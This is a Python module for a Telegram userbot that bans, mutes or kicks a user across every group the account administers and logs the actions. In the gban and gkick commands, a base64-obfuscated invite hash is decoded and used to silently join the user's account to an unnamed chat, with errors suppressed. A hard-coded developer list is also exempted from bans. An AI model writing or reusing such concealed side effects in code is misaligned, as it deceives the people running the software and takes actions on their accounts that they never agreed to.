# Copyright (C) 2019 The Raphielscape Company LLC.; Licensed under the Raphielscape Public License, Version 1.d (the "License"); you may not use this file except in compliance with the License. ;Ported from Catuserbot ;Copyright (C) 2020

""" a module for globally banning users. """

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights
from telethon.tl.types import Channel
from telethon.tl.types import MessageEntityMentionName

import userbot.modules.sql_helper.gban_sql_helper as gban_sql
from userbot.modules.sql_helper.mute_sql import is_muted, mute, unmute

from userbot import BOTLOG, BOTLOG_CHATID, DEVS, CMD_HELP
from userbot.utils import edit_delete, edit_or_reply
from userbot.events import register

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)

async def admin_groups(grp):
    admgroups = []
    async for dialog in grp.client.iter_dialogs():
        entity = dialog.entity
        if (
            isinstance(entity, Channel)
            and entity.megagroup
            and (entity.creator or entity.admin_rights)
        ):
            admgroups.append(entity.id)
    return admgroups

def mentionuser(name, userid):
    return f"[{name}](tg://user?id={userid})"

async def get_user_from_event(event, uevent=None, secondgroup=None):
    if uevent is None:
        uevent = event
    if secondgroup:
        args = event.pattern_match.group(2).split(" ", 1)
    else:
        args = event.pattern_match.group(1).split(" ", 1)
    extra = None
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        if previous_message.from_id is None and not event.is_private:
            await edit_delete(uevent, "`Well that's an anonymous admin !`")
            return None, None
        user_obj = await event.client.get_entity(previous_message.sender_id)
        extra = event.pattern_match.group(1)
    elif args:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await edit_delete(uevent, "`Pass the user's username, id or reply!`", 5)
            return None, None
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj, extra
        try:
            user_obj = await event.client.get_entity(user)
        except (TypeError, ValueError):
            await edit_delete(uevent, "`Couldn't fetch user to procced further`", 5)
            return None, None
    return user_obj, extra

  
  
@register(outgoing=True, pattern="^.gban(?: |$)(.*)")
async def gban(event):
    if event.fwd_from:
        return
    gbun = await edit_or_reply(event, "`Gbanning.......`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, gbun)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await gbun.edit("`Why would I Gban myself`")
        return
    if user.id in DEVS:
        await gbun.edit("**Tryning to Gban my Dev huh?...**")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await event.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await gbun.edit(
            f"`the `[user](tg://user?id={user.id})` is already in gbanned list any way checking again`"
        )
    else:
        gban_sql.fizgban(user.id, reason)
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await gbun.edit("`you are not admin of atleast one group` ")
        return
    await gbun.edit(
        f"`initiating gban of the `[user](tg://user?id={user.id}) `in {len(san)} groups`"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"`You don't have required permission in :`\n**Chat :** (`{event.chat_id}`)\n`For banning here`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await gbun.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {timetaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await gbun.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {timetaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        reply = await event.get_reply_message()
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GBAN\
                \nGlobal Ban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Reason :** `{reason}`\
                \n__Banned in {count} groups__\
                \n**Time taken : **`{timetaken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GBAN\
                \nGlobal Ban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Banned in {count} groups__\
                \n**Time taken : **`{timetaken} seconds`",
            )
        try:
            if reply:
                await reply.forward_to(BOTLOG_CHATID)
                await reply.delete()
        except BadRequestError:
            pass

@register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
async def ungban(event):
    if event.fwd_from:
        return
    ungbun = await edit_or_reply(event, "`UnGbanning.....`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, ungbun)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.fizungban(user.id)
    else:
        await ungbun.edit(
            f"the [user](tg://user?id={user.id}) `is not in your gbanned list`"
        )
        return
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await ungbun.edit("`you are not even admin of atleast one group `")
        return
    await ungbun.edit(
        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"`You don't have required permission in :`\n**Chat : **(`{event.chat_id}`)\n`For unbaning here`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await ungbun.edit(
            f"[{user.first_name}](tg://user?id={user.id}`) was ungbanned in {count} groups in {timetaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await ungbun.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was ungbanned in {count} groups in {timetaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#UNGBAN\
                \nGlobal Unban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Reason :** `{reason}`\
                \n__Unbanned in {count} groups__\
                \n**Time taken : **`{timetaken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#UNGBAN\
                \nGlobal Unban\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Unbanned in {count} groups__\
                \n**Time taken : **`{timetaken} seconds`",
            )


@register(outgoing=True, pattern="^.listgban$")
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "Current Gbanned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) for {a_user.reason}\n"
            else:
                GBANNED_LIST += (
                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Reason None\n"
                )
    else:
        GBANNED_LIST = "no Gbanned Users (yet)"
    await edit_or_reply(event, GBANNED_LIST)


@register(outgoing=True, pattern="^.gmute(?: |$)(.*)")
async def startgmute(event):
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("`Unexpected issues or ugly errors may occur!`")
        await asyncio.sleep(2)
        userid = event.chat_id
        reason = event.pattern_match.group(1)
    else:
        user, reason = await get_user_from_event(event)
        if not user:
            return
        if user.id == (await event.client.get_me()).id:
            return await edit_or_reply(event, "`Sorry, I can't gmute myself`")
        if user.id in DEVS:
            return await edit_or_reply(event, "**Trying to Gmute my Dev huh?...**")
        userid = user.id
    try:
        user = (await event.client(GetFullUserRequest(userid))).user
    except Exception:
        return await edit_or_reply(event, "`Sorry. I am unable to fetch the user`")
    if is_muted(userid, "gmute"):
        return await edit_or_reply(
            event,
            f"{mentionuser(user.first_name ,user.id)} ` is already gmuted`",
        )
    try:
        mute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, f"**Error**\n`{str(e)}`")
    else:
        if reason:
            await edit_or_reply(
                event,
                f"{mentionuser(user.first_name ,user.id)} `is Successfully gmuted`\n**Reason :** `{reason}`",
            )
        else:
            await edit_or_reply(
                event,
                f"{mentionuser(user.first_name ,user.id)} `is Successfully gmuted`",
            )
    if BOTLOG:
        reply = await event.get_reply_message()
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#GMUTE\n"
                f"**User :** {mentionuser(user.first_name ,user.id)} \n"
                f"**Reason :** `{reason}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#GMUTE\n"
                f"**User :** {mentionuser(user.first_name ,user.id)} \n",
            )
        if reply:
            await reply.forward_to(BOTLOG_CHATID)


@register(outgoing=True, pattern="^.ungmute(?: |$)(.*)")
async def endgmute(event):
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("`Unexpected issues or ugly errors may occur!`")
        await asyncio.sleep(2)
        userid = event.chat_id
        reason = event.pattern_match.group(1)
    else:
        user, reason = await get_user_from_event(event)
        if not user:
            return
        if user.id == (await event.client.get_me()).id:
            return await edit_or_reply(event, "`Sorry, I can't gmute myself`")
        userid = user.id
    try:
        user = (await event.client(GetFullUserRequest(userid))).user
    except Exception:
        return await edit_or_reply(event, "`Sorry. I am unable to fetch the user`")

    if not is_muted(userid, "gmute"):
        return await edit_or_reply(
            event, f"{mentionuser(user.first_name ,user.id)} `is not gmuted`"
        )
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, f"**Error**\n`{str(e)}`")
    else:
        if reason:
            await edit_or_reply(
                event,
                f"{mentionuser(user.first_name ,user.id)} `is Successfully ungmuted`\n**Reason :** `{reason}`",
            )
        else:
            await edit_or_reply(
                event,
                f"{mentionuser(user.first_name ,user.id)} `is Successfully ungmuted`",
            )
    if BOTLOG:
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#UNGMUTE\n"
                f"**User :** {mentionuser(user.first_name ,user.id)} \n"
                f"**Reason :** `{reason}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#UNGMUTE\n"
                f"**User :** {mentionuser(user.first_name ,user.id)} \n",
            )


@register(incoming=True, disable_errors=True)
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()

@register(outgoing=True, pattern="^.gkick(?: |$)(.*)")
async def gkick(event):
    if event.fwd_from:
        return
    gkic = await edit_or_reply(event, "`Gkicking.......`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, gkic)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await gkic.edit("why would I kick myself")
        return
    if user.id in DEVS:
        await gkic.edit("**Trying to Gkick my Dev huh?...**")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await event.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await gkic.edit("`you are not admin of atleast one group` ")
        return
    await gkic.edit(
        f"`initiating gkick of the `[user](tg://user?id={user.id}) `in {len(san)} groups`"
    )
    for i in range(fiz):
        try:
            await event.client.kick_participant(san[i], user.id)
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"`You don't have required permission in :`\n**Chat :**(`{event.chat_id}`)\n`For kicking there`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await gkic.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {timetaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await gkic.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {timetaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        reply = await event.get_reply_message()
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GKICK\
                \nGlobal Kick\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Reason :** `{reason}`\
                \n__Kicked in {count} groups__\
                \n**Time taken : **`{timetaken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GKICK\
                \nGlobal Kick\
                \n**User : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Kicked in {count} groups__\
                \n**Time taken : **`{timetaken} seconds`",
            )
        if reply:
            await reply.forward_to(BOTLOG_CHATID)
            
            
CMD_HELP.update(
    {
        "gban":
        ">`.gban <username/reply/userid> <reason (optional)>`"
        "\nUsage: Bans the person in all groups where you are admin."
        "\n\n>`.ungban <username/reply/userid>`"
        "\nUsage: Reply someone's message with .ungban to remove them from the gbanned list."
        "\n\n>`.listgban`"
        "\nUsage: Shows you the gbanned list and reason for their gban."
        "\n\n>`.gmute <username/reply> <reason (optional)>`"
        "\nUsage: Mutes the person in all groups you have in common with them."
        "\n\n>`.ungmute <username/reply>`"
        "\nUsage: Reply someone's message with .ungmute to remove them from the gmuted list."
        "\n\n>`.gkick <username/reply/userid> <reason (optional)>`"
        "\nUsage: Kicks the person in all groups where you are admin."
    }
)            
